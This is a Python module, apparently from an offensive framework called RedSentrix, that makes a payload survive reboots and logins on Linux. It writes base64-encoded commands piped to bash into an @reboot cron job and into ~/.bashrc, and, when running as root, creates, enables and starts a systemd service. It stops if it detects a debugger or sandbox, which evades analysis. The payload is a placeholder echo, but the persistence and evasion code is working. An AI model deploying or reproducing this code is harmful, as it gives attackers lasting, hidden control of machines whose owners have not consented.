import os
import subprocess
import base64
import time
from redsentrix_core.stealth_utils import StealthUtils
from redsentrix_core.logger import Logger

class LinuxPersistence:
    def __init__(self):
        self.logger = Logger()
        self.payload_command = "echo 'Persistence payload executed'"  # Placeholder payload
        self.encoded_payload = base64.b64encode(self.payload_command.encode()).decode()

    def _is_running_as_root(self):
        return os.geteuid() == 0

    def _add_cron_job(self):
        try:
            # Add a cron job that runs the payload at reboot
            cron_job = f"@reboot /bin/bash -c \"echo {self.encoded_payload} | base64 -d | bash\"\n"
            current_cron = subprocess.check_output(['crontab', '-l'], stderr=subprocess.DEVNULL).decode()
            if cron_job not in current_cron:
                new_cron = current_cron + cron_job
                p = subprocess.Popen(['crontab'], stdin=subprocess.PIPE)
                p.communicate(input=new_cron.encode())
                self.logger.log("Cron job added for persistence.")
            else:
                self.logger.log("Cron job already exists.")
        except subprocess.CalledProcessError:
            # No crontab exists yet
            p = subprocess.Popen(['crontab'], stdin=subprocess.PIPE)
            p.communicate(input=cron_job.encode())
            self.logger.log("Cron job created for persistence.")
        except Exception as e:
            self.logger.log(f"Failed to add cron job: {str(e)}")

    def _modify_bashrc(self):
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            payload_line = f"echo {self.encoded_payload} | base64 -d | bash\n"
            with open(bashrc_path, "r") as f:
                content = f.read()
            if payload_line not in content:
                with open(bashrc_path, "a") as f:
                    f.write(f"\n# RedSentrix persistence\n{payload_line}")
                self.logger.log(".bashrc modified for persistence.")
            else:
                self.logger.log(".bashrc already modified.")
        except Exception as e:
            self.logger.log(f"Failed to modify .bashrc: {str(e)}")

    def _add_systemd_service(self):
        try:
            if not self._is_running_as_root():
                self.logger.log("Systemd service requires root privileges, skipping.")
                return
            service_content = f"""[Unit]
Description=RedSentrix Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "echo {self.encoded_payload} | base64 -d | bash"
Restart=on-failure

[Install]
WantedBy=multi-user.target
"""
            service_path = "/etc/systemd/system/redsentrix_persistence.service"
            if not os.path.exists(service_path):
                with open(service_path, "w") as f:
                    f.write(service_content)
                subprocess.run(["systemctl", "enable", "redsentrix_persistence.service"], check=True)
                subprocess.run(["systemctl", "start", "redsentrix_persistence.service"], check=True)
                self.logger.log("Systemd service created and started for persistence.")
            else:
                self.logger.log("Systemd persistence service already exists.")
        except Exception as e:
            self.logger.log(f"Failed to add systemd service: {str(e)}")

    def run(self):
        if StealthUtils.is_debugger_present():
            self.logger.log("Debugger detected, aborting persistence.")
            return
        if StealthUtils.sandbox_check():
            self.logger.log("Sandbox detected, aborting persistence.")
            return

        self.logger.log("Starting Linux persistence module...")
        self._add_cron_job()
        self._modify_bashrc()
        self._add_systemd_service()
        self.logger.log("Linux persistence module completed.")

def run():
    LinuxPersistence().run()
